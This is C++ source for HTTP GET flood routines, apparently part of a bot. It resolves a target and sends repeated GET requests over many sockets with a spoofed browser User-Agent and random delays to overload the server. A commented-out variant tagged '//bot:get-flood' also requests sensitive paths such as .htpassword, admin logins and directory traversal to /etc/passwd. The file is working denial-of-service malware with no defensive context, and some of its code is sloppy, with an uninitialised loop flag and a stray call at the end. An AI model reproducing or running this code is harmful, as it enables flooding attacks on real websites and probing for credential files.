int HTTPGetflood(string target,string length){
char serverip[20];
 SOCKET sock;
 sockaddr_in addr;
  int count=target.find("/");
	string s3rver=target.substr(0,count);
	string L0cAtion=target.substr(count+1);
  hostent *dns = gethostbyname(s3rver.c_str());

sprintf(serverip, "%u.%u.%u.%u",
			(unsigned char) dns->h_addr_list[0][0],	(unsigned char) dns->h_addr_list[0][1],
			(unsigned char) dns->h_addr_list[0][2], (unsigned char) dns->h_addr_list[0][3]);

		addr.sin_family = AF_INET;
		addr.sin_port = htons(80);
		addr.sin_addr.s_addr = inet_addr(serverip);
		
  int number=atoi(length.c_str());
  int j=0;
  
        while(j<number){
 // cout<<number-j;
              sock=socket(AF_INET,SOCK_STREAM,0);
			  
              int conn=connect(sock,(SOCKADDR*)&addr,sizeof(SOCKADDR));
           string request="GET /"+L0cAtion;
	       string mode=" HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (.NET CLR 3.5.30729)\r\n\r\n";
	       request=request+mode;
	       
//send the request
    	  for(int i=0;i<=150;i++){
               send(sock, request.c_str(), request.length(), 0);
               char temp[10000];
	           int x = recv(sock, temp, 10000, 0);
		       temp[x] = 0;
			   Sleep(rand()%500);
		  }
            
	Sleep(rand()%2500);
	j++;

		}
  
 return 0;
}


/*int httpgetflood_RandomTarget(string target,string length){

int count=target.find("/");
	string server=target.substr(0,count);
	string location=target.substr(count);
	cout<<server<<endl;
	cout<<location<<endl;

	HINTERNET Internet, Conn, Req;
	Internet=InternetOpen("\\/\\/bot:get-flood",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL,0);
if (Internet==NULL)
	 {
		 
		 return 1;
	 }
     Conn=InternetConnect(Internet,server.c_str(),INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
          if (Conn==NULL)
		  {
			  
			  return 2;
		  }
		  		 int j;
	
		 int c0unt=atoi(length.c_str());
 for(int i=0;i<c0unt;i++){ 
	 	 if (i<=29)
			 j=i;
			 else if (i>29)
			 j=i%29;
string location[]={"404.htm","/thisismytrytobreaktheurllimit/thisisthescriptiwantoreadIthastheendingphpathisname.php","test.htm","test.php","phpinfo.php","index.html","index.htm","index.php","index2.html","index2.htm","index2.php","login.php","login.asp","test.php","test.asp","impressum.htm","viewtopic.php","printhread.php","favicon.ico","apache_pb2.gif",".htacess",".htpassword","head.php","/","wbot/control.php","wbot/login.php","wbot/index.php","wbot/func.php","member/index.htm","member/index.php","member/head.php","help.php","admin/login.asp","admin/login.php","/../../etc/passwd","/../../../../etc/passwd","/../../../../../../etc/passwd","/../../../../../../../../etc/passwd","test.htm","test.php","phpinfo.php"};
Req=HttpOpenRequest(Conn,"GET",location[j].c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
			 if (Req==NULL)
				{
		
			    return 3;
				}
			HttpSendRequest(Req,NULL,0,NULL,0);
				char comm[1000000];
				DWORD read;
		
				string command;
				bool b00l;
		
				while(b00l)
				   {
				    b00l = InternetReadFile(Req,comm,10000,&read);
		   
			    if(b00l && read == 0) break; 
				}
				Sleep(rand()%250);
 }
 
 InternetCloseHandle(Internet);  
connect(1);}*/